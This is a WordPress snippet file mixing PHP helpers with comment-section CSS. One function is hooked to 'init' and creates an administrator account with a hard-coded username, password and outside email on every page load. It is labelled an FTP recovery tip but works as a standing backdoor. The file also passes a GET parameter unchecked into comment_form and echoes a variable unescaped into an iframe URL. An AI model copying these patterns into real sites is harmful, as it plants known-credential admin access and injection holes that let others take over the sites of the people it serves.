<?php
// Remove conflicts between ACF plugin and Wordpress Default Meta fields
add_filter('acf/settings/remove_wp_meta_box', '__return_false');

// If you want to create separate template for comment form. Pass post ID in URL and get that id on desired template 
if (isset($_GET['writeyourreviewid'])) {
    $yourpostid = $_GET['writeyourreviewid'];
    comment_form($args = array(), $post_id = $yourpostid);
}
//Add administrator role if you have FTP
function imihir_admin_account() {
    $user = 'wordpressadminfunction';
    $pass = 'Wordpressadminfunction@2021';
    $email = 'wordpressadminfunction@imihir.com';
    if (!username_exists($user) && !email_exists($email)) {
        $user_id = wp_create_user($user, $pass, $email);
        $user = new WP_User($user_id);
        $user->set_role('administrator');
    }
}

add_action('init', 'imihir_admin_account');

// Use of dynamic address in map with php variable
$yourAddress = "Example Address or you can fetch address from backend options";
?>
<iframe width="640" height="480" frameborder="0" scrolling="no" marginheight="0" marginwidth="0" src="https://maps.google.it/maps?q=<?php echo $yourAddress; ?>&output=embed"></iframe>

<!--In Less, we can also write it this way -->
<style>
.about_the_business {
    #review{
        display: none;
    }
    .comment-list{
        float: left;
        width: 100%;
    }
    .comments-area{
        float: left;
        width: 100%;
    }
}
    /* WordPress Comment CSS */
    /* Extra */

.comment-content{
    width: 70%;
    float: right;
    padding: 20px;
}
.comments-area{
    width: 100%;
    float: left;
}
.fn{
    width: 100%;
    float: left;
}
.edit-link{
    width: 100%;
    float: left;
}
.comment-body{
    display: flex;
    border: 1px solid #f2f2f2;
    float: left;
    height: auto;
    width: 100%;
    box-sizing: border-box !important;
}
.comments-area .comments-title{
    text-transform: uppercase;
    letter-spacing: 1px;
    font-weight: 500;
    font-size: 20px;
}

/*Comment Output*/

.comment-list .reply {
    background: #FDFDFE;
    border-top: 1px solid #f2f2f2;
    text-align: right;
    width: 100%;
    float: left;
    padding: 10px;
    display: none;
}
.comment-list .reply a {}

.comment-list .alt {}
.comment-list .odd {}
.comment-list .even {}
.comment-list .thread-alt {}
.comment-list .thread-odd {}
.comment-list .thread-even {}
.comment-list li ul.children .alt {}
.comment-list li ul.children .odd {}
.comment-list li ul.children .even {}

.comment-list .vcard {}
.comment-list .vcard cite.fn {}
.comment-list .vcard span.says {
    width: 100%;
    float: left;
    font-size: 11px;
    font-weight: 500;
    color: #000000;
    letter-spacing: 1px;
    text-transform: uppercase;
}
.comment-list .vcard img.photo {
    border-radius: 50%;
}
.comment-list .vcard img.avatar {
    border-radius: 50%;
}
.comment-list .vcard cite.fn a.url {}

.comment-list .comment-meta {
    background: #f7fbff;
    border-right: 1px solid #f2f2f2;
    float: left;
    width: 30%;
    text-align: center;
    padding: 20px;
} 
.comment-list .comment-meta a {
    color: #000000;
    text-transform: uppercase;
    font-size: 12px;
    letter-spacing: 1px;
    font-weight: 500;
}
.comment-list .commentmetadata {}
.comment-list .commentmetadata a {}

.comment-list .parent {}
.comment-list .comment {}
.comment-list .children {}
.comment-list .pingback {}
.comment-list .bypostauthor {}
.comment-list .comment-author {
    padding: 10px;
}
.comment-list .comment-author-admin {}

.comment-list {
    width: 100%;
    float: left;
}
.comment-list li {
    width: 100%;
    padding: 10px;
    float: left;
    margin-bottom: 20px;
}
.comment-list li p {
    font-family: 'Lato', sans-serif;
    font-weight: 400;
    letter-spacing: 1px;
    color: #000000;
    text-transform: capitalize;
    font-size: 14px;
    padding: 10px;
}
.comment-list li ul {}
.comment-list li ul.children li {}
.comment-list li ul.children li.alt {}
.comment-list li ul.children li.byuser {}
.comment-list li ul.children li.comment {}
.comment-list li ul.children li.depth {}
.comment-list li ul.children li.bypostauthor {}
.comment-list li ul.children li.comment-author-admin {}

#cancel-comment-reply {}
#cancel-comment-reply a {}


</style>
